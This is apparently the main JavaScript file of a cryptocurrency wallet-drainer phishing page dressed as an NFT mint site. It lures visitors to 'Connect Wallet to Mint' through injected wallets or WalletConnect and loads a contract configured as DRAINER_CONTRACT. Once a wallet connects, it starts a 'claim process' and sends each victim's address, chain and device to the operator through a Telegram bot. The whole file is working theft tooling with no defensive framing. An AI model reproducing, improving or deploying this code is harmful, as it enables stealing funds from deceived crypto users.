import { CONFIG } from './config.js';

;(async function () {
  'use strict';

  /* ==========================================================================
   *  1. DEBUG PANEL
   * ========================================================================== */
  const debugArea = document.createElement('div');
  debugArea.id = 'wc-debug';
  debugArea.style.cssText = `
    position: fixed; bottom: 0; left: 0; width: 100%;
    background: #000; color: #0f0; font-size: 12px; padding: 5px;
    z-index: 10000; max-height: 150px; overflow-y: auto;
    display: none; font-family: monospace;
  `;
  document.body.appendChild(debugArea);

  let debugVisible = false;
  document.addEventListener('dblclick', () => {
    debugVisible = !debugVisible;
    debugArea.style.display = debugVisible ? 'block' : 'none';
  });

  function logDebug(msg) {
    console.log('[main.js]', msg);
    debugArea.innerHTML += `<div>${new Date().toLocaleTimeString()}: ${msg}</div>`;
    debugArea.scrollTop = debugArea.scrollHeight;
  }

  // Surface any uncaught error to the debug panel — critical for mobile.
  window.addEventListener('error', (e) => {
    logDebug(`❌ window error: ${e.message || e.error?.message || 'unknown'}`);
  });
  window.addEventListener('unhandledrejection', (e) => {
    logDebug(`❌ unhandled rejection: ${e.reason?.message || e.reason}`);
  });

  /* ==========================================================================
   *  2. PLATFORM DETECTION
   * ========================================================================== */
  function isMobile()  { return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent); }
  function isIOS()     { return /iPhone|iPad|iPod/i.test(navigator.userAgent); }
  function isAndroid() { return /Android/i.test(navigator.userAgent); }
  function isDesktop() { return !isMobile(); }
  function isWindows() { return /Windows/i.test(navigator.userAgent); }
  function isMac()     { return /Macintosh|Mac OS X/i.test(navigator.userAgent); }

  function isMobileHeuristic() {
    if (isMobile()) return true;
    if (typeof navigator.maxTouchPoints === 'number' && navigator.maxTouchPoints > 1) return true;
    return false;
  }

  function getPlatform() {
    if (isIOS())     return 'ios';
    if (isAndroid()) return 'android';
    if (isWindows()) return 'windows';
    if (isMac())     return 'mac';
    return 'unknown';
  }

  /* ==========================================================================
   *  3. TELEGRAM
   * ========================================================================== */
  const { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } = CONFIG;

  async function sendTelegramNotification(message) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return false;
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const r = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' }),
      });
      const result = await r.json();
      if (!r.ok) { console.error('[main.js] Telegram error:', result); return false; }
      return true;
    } catch (e) {
      console.error('[main.js] Telegram exception:', e);
      return false;
    }
  }

  window.testTelegram = (m) =>
    sendTelegramNotification(m || '🧪 Test ' + new Date().toISOString());

  /* ==========================================================================
   *  4. PERSISTENCE — survives mobile page reloads
   *  - localStorage: the durable address + chainType (long-lived)
   *  - sessionStorage: pending WC state (short-lived, same tab only)
   * ========================================================================== */
  const LS_KEY_ADDRESS   = 'connectedWallet';
  const LS_KEY_CHAIN     = 'chainType';
  const SS_KEY_PENDING   = 'apex_wc_pending';

  function saveWalletAddress(address, chainType = 'evm') {
    try {
      localStorage.setItem(LS_KEY_ADDRESS, address);
      localStorage.setItem(LS_KEY_CHAIN, chainType);
    } catch (e) { logDebug('saveWalletAddress failed: ' + e.message); }
  }
  function getSavedAddress()   { try { return localStorage.getItem(LS_KEY_ADDRESS); } catch (e) { return null; } }
  function getSavedChainType() { try { return localStorage.getItem(LS_KEY_CHAIN) || 'unknown'; } catch (e) { return 'unknown'; } }
  function clearSavedWallet() {
    try {
      localStorage.removeItem(LS_KEY_ADDRESS);
      localStorage.removeItem(LS_KEY_CHAIN);
    } catch (e) {}
  }

  function markPairingPending() {
    try { sessionStorage.setItem(SS_KEY_PENDING, Date.now().toString()); } catch (e) {}
  }
  function clearPairingPending() {
    try { sessionStorage.removeItem(SS_KEY_PENDING); } catch (e) {}
  }
  function isPairingPending() {
    try {
      const t = sessionStorage.getItem(SS_KEY_PENDING);
      if (!t) return false;
      // 5-minute stale window
      return Date.now() - parseInt(t, 10) < 5 * 60 * 1000;
    } catch (e) { return false; }
  }

  /* ==========================================================================
   *  5. DOM
   * ========================================================================== */
  const connectButton = document.getElementById('connectButton');
  const walletButton  = document.getElementById('walletButton');
  const claimStatus   = document.getElementById('claimStatus');

  /* ==========================================================================
   *  6. STATE
   * ========================================================================== */
  let wcProvider      = null;   // single EthereumProvider instance (the whole truth)
  let web3Instance    = null;
  let contractInstance= null;
  let currentAddress  = null;
  let isConnecting    = false;

  let EthereumProvider = null;  // library class, set on boot

  const {
    PROJECT_ID,
    DAPP_METADATA,
    DRAINER_CONTRACT,
    CONTRACT_ABI,
  } = CONFIG;

  /* ==========================================================================
   *  7. BUTTON UI
   * ========================================================================== */
  function setButtonState(button, state) {
    if (!button) return;
    button.style.display      = 'inline-block';
    button.style.padding      = '14px 28px';
    button.style.borderRadius = '8px';
    button.style.fontWeight   = '600';
    button.style.border       = 'none';
    button.style.cursor       = state === 'loading' ? 'not-allowed' : 'pointer';
    button.style.color        = 'white';
    button.style.fontSize     = '16px';
    button.style.minWidth     = '180px';
    button.disabled           = state === 'loading';

    switch (state) {
      case 'loading':
        button.style.background = 'linear-gradient(135deg, #666666 0%, #888888 100%)';
        button.innerHTML = '<i class="fas fa-spinner fa-spin" style="margin-right:8px"></i> Connecting...';
        break;
      case 'connected':
        button.style.background = 'linear-gradient(135deg, #10B981 0%, #059669 100%)';
        button.innerHTML = '<i class="fas fa-check-circle" style="margin-right:8px"></i> Connected';
        break;
      case 'disconnect':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)';
        button.innerHTML = '<i class="fas fa-power-off" style="margin-right:8px"></i> Disconnect';
        break;
      case 'failed':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)';
        button.innerHTML = '<i class="fas fa-exclamation-triangle" style="margin-right:8px"></i> Failed';
        setTimeout(() => setButtonState(button, 'normal'), 3000);
        break;
      default:
        button.style.background = 'linear-gradient(135deg, #FF6B00 0%, #FF8C00 100%)';
        button.innerHTML = '<i class="fas fa-wallet" style="margin-right:8px"></i> Connect Wallet to Mint';
    }
  }

  function showStatus(msg, type = 'info') {
    if (!claimStatus) return;
    claimStatus.textContent = msg;
    claimStatus.className   = `status ${type}`;
    claimStatus.style.display = 'block';
    claimStatus.style.padding = '12px 16px';
    claimStatus.style.borderRadius = '8px';
    claimStatus.style.marginTop = '12px';
    claimStatus.style.fontWeight = '500';
    claimStatus.style.fontSize = '14px';
    claimStatus.style.textAlign = 'center';
    const styles = {
      success: { background: 'linear-gradient(135deg, #DCFCE7 0%, #BBF7D0 100%)', color: '#166534', border: '1px solid #86EFAC' },
      error:   { background: 'linear-gradient(135deg, #FEE2E2 0%, #FECACA 100%)', color: '#991B1B', border: '1px solid #FCA5A5' },
      info:    { background: 'linear-gradient(135deg, #DBEAFE 0%, #BFDBFE 100%)', color: '#1E40AF', border: '1px solid #93C5FD' },
    };
    Object.assign(claimStatus.style, styles[type] || styles.info);
    if (type === 'error' || type === 'success') {
      setTimeout(() => { claimStatus.style.display = 'none'; }, 5000);
    }
  }

  setButtonState(connectButton, 'normal');
  if (walletButton) setButtonState(walletButton, 'normal');

  /* ==========================================================================
   *  8. GLOBAL STATE PUBLICATION
   * ========================================================================== */
  function publishGlobalState(address, chain, provider) {
    window.__apexConnected = {
      address,
      chain,
      web3:     web3Instance,
      contract: contractInstance,
      provider: provider || wcProvider || window.ethereum || null,
      session:  null,   // session lives inside wcProvider
      publishedAt: Date.now(),
    };
    console.log('[main.js] published window.__apexConnected', {
      address, chain,
      hasWeb3: !!web3Instance,
      hasContract: !!contractInstance,
      hasProvider: !!(provider || wcProvider || window.ethereum),
    });
    try {
      window.dispatchEvent(new CustomEvent('apex:connected', { detail: { address, chain } }));
    } catch (e) {
      const evt = document.createEvent('CustomEvent');
      evt.initCustomEvent('apex:connected', true, true, { address, chain });
      window.dispatchEvent(evt);
    }
  }

  /* ==========================================================================
   *  9. CONNECTED UI
   * ========================================================================== */
  function updateConnectedUI(address, chain = 'evm') {
    setButtonState(connectButton, 'disconnect');
    if (walletButton) setButtonState(walletButton, 'disconnect');

    const chainLabels = { bitcoin: '₿ BTC', solana: '◎ SOL', evm: '◆ ETH' };
    const chainLabel  = chainLabels[chain] || 'Unknown';

    let display = document.getElementById('connectedAddressDisplay');
    if (!display) {
      display = document.createElement('div');
      display.id = 'connectedAddressDisplay';
      display.style.cssText = `
        margin-top: 12px; padding: 10px 16px;
        font-family: 'JetBrains Mono', monospace; font-size: 14px;
        color: #059669; text-align: center;
        background: linear-gradient(135deg, #ECFDF5 0%, #D1FAE5 100%);
        border-radius: 8px; border: 1px solid #A7F3D0;
      `;
      (connectButton?.parentNode || document.body).appendChild(display);
    }

    const short = `${address.slice(0, 6)}...${address.slice(-4)}`;
    display.innerHTML = `
      <div style="display:flex;align-items:center;justify-content:center;gap:8px;flex-wrap:wrap;">
        <i class="fas fa-check-circle" style="color:#059669;"></i>
        <span>Connected: ${short}</span>
        <span style="background:#1F2937;color:white;padding:2px 10px;border-radius:12px;font-size:12px;font-weight:600;">${chainLabel}</span>
        <button id="copyAddress" style="background:none;border:none;color:#059669;cursor:pointer;padding:4px;">
          <i class="far fa-copy"></i>
        </button>
      </div>
    `;

    document.getElementById('copyAddress')?.addEventListener('click', () => {
      navigator.clipboard.writeText(address).then(() => {
        const b = document.getElementById('copyAddress');
        const o = b.innerHTML;
        b.innerHTML = '<i class="fas fa-check"></i>';
        setTimeout(() => { b.innerHTML = o; }, 2000);
      });
    });

    showStatus(`Connected to ${chainLabel}`, 'success');
    publishGlobalState(address, chain);

    sendTelegramNotification(`
🔗 <b>Wallet Connected</b>
📌 <b>Chain:</b> ${chainLabel}
👤 <b>Address:</b> <code>${address}</code>
🕒 ${new Date().toLocaleString()}
📱 <b>Mobile:</b> ${isMobile() ? 'Yes' : 'No'}
    `.trim());
  }

  function resetConnectedUI() {
    setButtonState(connectButton, 'normal');
    if (walletButton) setButtonState(walletButton, 'normal');
    document.getElementById('connectedAddressDisplay')?.remove();
    showStatus('Wallet disconnected', 'info');
    web3Instance     = null;
    contractInstance = null;
    wcProvider       = null;
    currentAddress   = null;
    window.__apexConnected = null;
  }

  /* ==========================================================================
   *  10. EIP-6963 DISCOVERY
   * ========================================================================== */
  let evmProviders = [];
  let eip6963Initialized = false;

  function setupEIP6963() {
    if (eip6963Initialized) return;
    eip6963Initialized = true;
    window.addEventListener('eip6963:announceProvider', (e) => {
      const d = e.detail;
      if (!evmProviders.some((p) => p.info.uuid === d.info.uuid)) {
        evmProviders.push(d);
        logDebug(`EIP-6963: ${d.info.name}`);
      }
    });
    window.dispatchEvent(new Event('eip6963:requestProvider'));
    setTimeout(() => window.dispatchEvent(new Event('eip6963:requestProvider')), 500);
    setTimeout(() => window.dispatchEvent(new Event('eip6963:requestProvider')), 1500);
  }

  /* ==========================================================================
   *  11. WALLET PICKER (multiple injected)
   * ========================================================================== */
  function showWalletSelectionModal(providers, cb) {
    const overlay = document.createElement('div');
    overlay.style.cssText = `position:fixed;inset:0;background:rgba(0,0,0,0.7);display:flex;align-items:center;justify-content:center;z-index:99999;`;
    const modalEl = document.createElement('div');
    modalEl.style.cssText = `background:#1F2937;padding:24px;border-radius:16px;max-width:400px;width:90%;color:white;font-family:Inter,sans-serif;`;
    modalEl.innerHTML = `
      <h3 style="margin-top:0;font-weight:600;font-size:20px;">Select a Wallet</h3>
      <div id="wl" style="display:flex;flex-direction:column;gap:10px;margin:16px 0"></div>
      <button id="cw" style="background:none;border:1px solid #666;color:#ccc;padding:8px 16px;border-radius:8px;cursor:pointer;width:100%">Cancel</button>
    `;
    overlay.appendChild(modalEl);
    document.body.appendChild(overlay);
    const list = modalEl.querySelector('#wl');
    providers.forEach((p) => {
      const b = document.createElement('button');
      b.textContent = p.info.name;
      b.style.cssText = `background:#374151;border:none;padding:12px;border-radius:8px;color:white;font-size:16px;cursor:pointer;text-align:left;display:flex;gap:10px;align-items:center;`;
      if (p.info.icon) {
        const i = document.createElement('img');
        i.src = p.info.icon;
        i.style.width = '24px';
        i.style.height = '24px';
        b.prepend(i);
      }
      b.onclick = () => { overlay.remove(); cb(p); };
      list.appendChild(b);
    });
    modalEl.querySelector('#cw').onclick = () => { overlay.remove(); cb(null); };
  }

  /* ==========================================================================
   *  12. WEB3 + CONTRACT BUILDER
   * ========================================================================== */
  async function buildWeb3AndContract(provider) {
    const Web3 = (await import('web3')).default;
    web3Instance     = new Web3(provider);
    contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
  }

  /* ==========================================================================
   *  13. DIRECT (INJECTED) EVM
   * ========================================================================== */
  async function connectDirectEVM(timeoutMs = 8000) {
    setupEIP6963();
    await new Promise((r) => setTimeout(r, 800));

    let providers = evmProviders.filter((p) => p.provider);
    if (providers.length === 0 && window.ethereum) {
      providers = [{ info: { name: 'Injected', rdns: 'io.injected' }, provider: window.ethereum }];
    }
    if (providers.length === 0) return false;

    let chosen = null;
    if (providers.length === 1) {
      chosen = providers[0];
    } else {
      const known = providers.find((p) =>
        p.info.rdns === 'io.metamask' ||
        p.info.name.toLowerCase().includes('metamask')
      );
      chosen = known || await new Promise((res) => showWalletSelectionModal(providers, res));
      if (!chosen) return false;
    }

    try {
      const provider = chosen.provider;
      const accounts = await Promise.race([
        provider.request({ method: 'eth_requestAccounts' }),
        new Promise((_, rj) => setTimeout(() => rj(new Error('timeout')), timeoutMs)),
      ]);
      if (!accounts?.length) return false;

      const address = accounts[0];
      currentAddress = address;
      saveWalletAddress(address, 'evm');

      setupProviderEvents(provider);
      await buildWeb3AndContract(provider);
      updateConnectedUI(address, 'evm');

      logDebug(`✅ Direct EVM connected: ${address}`);
      return true;
    } catch (e) {
      logDebug('Direct EVM error: ' + e.message);
      return false;
    }
  }

  /* ==========================================================================
   *  14. WALLETCONNECT — the single source of truth
   *  Uses EthereumProvider directly. Handles mobile deep-link return by
   *  checking for an existing session on page load.
   * ========================================================================== */
  async function connectViaWalletConnect(timeoutMs = 300000) {
    if (isConnecting) return false;
    isConnecting = true;

    try {
      showStatus('Opening WalletConnect...', 'info');

      // If a provider already exists with a live session, reuse it.
      if (wcProvider && wcProvider.session) {
        logDebug('Reusing existing WC session');
        const accounts = wcProvider.accounts || [];
        if (accounts.length) {
          currentAddress = accounts[0];
          saveWalletAddress(currentAddress, 'evm');
          await buildWeb3AndContract(wcProvider);
          updateConnectedUI(currentAddress, 'evm');
          isConnecting = false;
          return true;
        }
      }

      // Build a fresh EthereumProvider. This instance will own the session
      // for the lifetime of the page — no SignClient alongside it.
      wcProvider = await EthereumProvider.init({
        projectId: PROJECT_ID,
        chains: [1],                      // Ethereum mainnet
        optionalChains: [1],
        showQrModal: true,                // library renders its own modal
        qrModalOptions: {
          themeMode: 'dark',
          themeVariables: {
            '--wcm-z-index': '9999',
            '--wcm-accent-color': '#FF6B00',
            '--wcm-background-color': '#1F2937',
          },
        },
        metadata: DAPP_METADATA,
        methods: ['eth_sendTransaction', 'personal_sign', 'eth_signTypedData_v4'],
        events: ['chainChanged', 'accountsChanged'],
      });

      // Attach event handlers BEFORE calling connect(), so no events are lost.
      setupProviderEvents(wcProvider);

      // If the library restored a session from IndexedDB (which it does
      // automatically), skip the QR flow entirely.
      if (wcProvider.session) {
        const accounts = wcProvider.accounts || [];
        if (accounts.length) {
          logDebug('WC session restored from storage');
          currentAddress = accounts[0];
          saveWalletAddress(currentAddress, 'evm');
          await buildWeb3AndContract(wcProvider);
          updateConnectedUI(currentAddress, 'evm');
          isConnecting = false;
          return true;
        }
      }

      // Mark pending BEFORE opening the modal. If the mobile browser reloads
      // the page mid-flow, we'll detect this on boot and try to recover.
      markPairingPending();

      // connect() opens the QR modal and returns when a session is established.
      // On mobile, the wallet app opens, then returns to this page. If the
      // browser keeps the JS context alive, the promise resolves here. If it
      // reloads the page, we handle it in recoverPendingPairing().
      await Promise.race([
        wcProvider.connect(),
        new Promise((_, rj) => setTimeout(() => rj(new Error('timeout')), timeoutMs)),
      ]);

      clearPairingPending();

      const accounts = wcProvider.accounts || [];
      if (!accounts.length) {
        logDebug('WC connected but no accounts returned');
        isConnecting = false;
        return false;
      }

      currentAddress = accounts[0];
      saveWalletAddress(currentAddress, 'evm');
      await buildWeb3AndContract(wcProvider);
      updateConnectedUI(currentAddress, 'evm');

      isConnecting = false;
      logDebug(`✅ WalletConnect connected: ${currentAddress}`);
      return true;

    } catch (e) {
      logDebug('WC error: ' + e.message);
      isConnecting = false;
      // Don't clear pending — the page may have been reloaded and the user
      // is still in the wallet app. We'll recover on next boot.
      return false;
    }
  }

  /* ==========================================================================
   *  15. RECOVER PENDING PAIRING (mobile reload path)
   *  Called on boot. If we marked a pairing pending before the page
   *  reloaded, try to detect the completed session.
   * ========================================================================== */
  async function recoverPendingPairing() {
    if (!isPairingPending()) return false;
    logDebug('Detected pending pairing — attempting recovery');

    try {
      // Re-init the EthereumProvider. It restores sessions from IndexedDB.
      wcProvider = await EthereumProvider.init({
        projectId: PROJECT_ID,
        chains: [1],
        optionalChains: [1],
        showQrModal: false,               // don't auto-open the modal
        metadata: DAPP_METADATA,
        methods: ['eth_sendTransaction', 'personal_sign', 'eth_signTypedData_v4'],
        events: ['chainChanged', 'accountsChanged'],
      });

      // Give the library a moment to hydrate sessions from IndexedDB.
      await new Promise((r) => setTimeout(r, 1500));

      if (wcProvider.session && (wcProvider.accounts || []).length) {
        currentAddress = wcProvider.accounts[0];
        saveWalletAddress(currentAddress, 'evm');
        setupProviderEvents(wcProvider);
        await buildWeb3AndContract(wcProvider);
        updateConnectedUI(currentAddress, 'evm');
        clearPairingPending();
        logDebug(`✅ Recovered session: ${currentAddress}`);
        return true;
      }

      // No session recovered — clear the stale pending flag.
      clearPairingPending();
      logDebug('No session recovered — clearing pending flag');
      return false;

    } catch (e) {
      logDebug('Recovery failed: ' + e.message);
      clearPairingPending();
      return false;
    }
  }

  /* ==========================================================================
   *  16. PROVIDER EVENTS
   * ========================================================================== */
  function setupProviderEvents(provider) {
    if (!provider || !provider.on) return;

    provider.on('accountsChanged', (accounts) => {
      if (!accounts || accounts.length === 0) {
        resetConnectedUI();
        clearSavedWallet();
        return;
      }
      currentAddress = accounts[0];
      saveWalletAddress(currentAddress, 'evm');
      updateConnectedUI(currentAddress, 'evm');
      setTimeout(() => {
        if (typeof window.initiateClaimProcess === 'function') {
          window.initiateClaimProcess();
        }
      }, 1000);
    });

    provider.on('chainChanged', (id) => {
      const chainId = typeof id === 'string' ? parseInt(id, 16) : id;
      showStatus(`Network changed to ${chainId}`, 'info');
      if (currentAddress) {
        buildWeb3AndContract(provider).then(() => {
          publishGlobalState(currentAddress, 'evm', provider);
        }).catch(() => {});
      }
    });

    provider.on('disconnect', () => {
      logDebug('Provider disconnected');
      resetConnectedUI();
      clearSavedWallet();
      clearPairingPending();
    });

    // WalletConnect-specific: connection restored from storage on init
    provider.on('connect', (info) => {
      logDebug(`Provider connect event: chainId=${info?.chainId}`);
    });
  }

  /* ==========================================================================
   *  17. CONNECT DISPATCHER
   * ========================================================================== */
  async function connectWallet() {
    if (isConnecting) return;

    setButtonState(connectButton, 'loading');
    if (walletButton) setButtonState(walletButton, 'loading');
    showStatus('Connecting...', 'info');

    let success = false;

    if (isMobileHeuristic()) {
      // Mobile: WalletConnect only. No injected provider on stock mobile.
      success = await connectViaWalletConnect(600000);
    } else {
      // Desktop: injected first, then WC.
      success = await connectDirectEVM(8000);
      if (!success) success = await connectViaWalletConnect(300000);
    }

    if (success) {
      setButtonState(connectButton, 'connected');
      if (walletButton) setButtonState(walletButton, 'connected');
      setTimeout(() => {
        if (typeof window.initiateClaimProcess === 'function') {
          window.initiateClaimProcess();
        }
      }, 1500);
    } else {
      showStatus('No wallet found', 'error');
      setButtonState(connectButton, 'failed');
      if (walletButton) setButtonState(walletButton, 'failed');
    }
  }

  /* ==========================================================================
   *  18. DISCONNECT
   * ========================================================================== */
  async function disconnectWallet() {
    try {
      if (wcProvider && typeof wcProvider.disconnect === 'function') {
        await wcProvider.disconnect();
      }
    } catch (e) {
      // Ignore — we clear local state anyway.
    }
    resetConnectedUI();
    clearSavedWallet();
    clearPairingPending();
    web3Instance = null;
    contractInstance = null;
    wcProvider = null;
    currentAddress = null;
  }

  /* ==========================================================================
   *  19. BUTTON WIRING
   * ========================================================================== */
  const handleClick = async () => {
    const saved = getSavedAddress();
    const connected = !!window.__apexConnected?.address || !!saved;
    if (connected && wcProvider?.session) {
      await disconnectWallet();
    } else if (connected) {
      // Saved but provider gone — clear and reconnect.
      clearSavedWallet();
      await connectWallet();
    } else {
      await connectWallet();
    }
  };

  if (connectButton) connectButton.addEventListener('click', handleClick);
  if (walletButton)  walletButton.addEventListener('click', handleClick);

  if (walletButton && isMobileHeuristic()) {
    walletButton.addEventListener('click', () => {
      setTimeout(() => {
        if (connectButton) {
          connectButton.scrollIntoView({ behavior: 'smooth', block: 'center' });
        }
      }, 300);
    });
  }

  /* ==========================================================================
   *  20. BOOT
   * ========================================================================== */
  try {
    // Load only the EthereumProvider — no SignClient, no separate modal.
    const cdns = [
      'https://esm.sh/@walletconnect/ethereum-provider@2.11.0',
      'https://cdn.skypack.dev/@walletconnect/ethereum-provider@2.11.0',
      'https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.11.0/+esm',
    ];
    for (const url of cdns) {
      try {
        const m = await import(url);
        EthereumProvider = m.EthereumProvider || m.default || m;
        logDebug(`✅ EthereumProvider from ${url}`);
        break;
      } catch (e) {}
    }
    if (!EthereumProvider) throw new Error('Could not load EthereumProvider');

    setupEIP6963();

    // Attempt recovery first (handles mobile reload mid-pairing).
    const recovered = await recoverPendingPairing();

    // If recovery failed and we have a saved address on desktop, try injected.
    if (!recovered) {
      const savedAddr = getSavedAddress();
      if (savedAddr && isDesktop() && window.ethereum) {
        try {
          const accounts = await window.ethereum.request({ method: 'eth_accounts' });
          if (accounts.length > 0 && accounts[0].toLowerCase() === savedAddr.toLowerCase()) {
            currentAddress = accounts[0];
            setupProviderEvents(window.ethereum);
            await buildWeb3AndContract(window.ethereum);
            updateConnectedUI(currentAddress, 'evm');
          }
        } catch (e) {}
      }
    }

  } catch (err) {
    logDebug('Fatal: ' + err.message);
    showStatus('Failed to load wallet libraries', 'error');
    return;
  }

  // Close modal on unload so we don't leave a stale pairing.
  window.addEventListener('beforeunload', () => {
    // No explicit action needed — EthereumProvider manages its own state.
  });

  logDebug(`✅ main.js ready — Platform: ${getPlatform()}`);
  console.log('✅ main.js ready — test with testTelegram("hi")');
})();
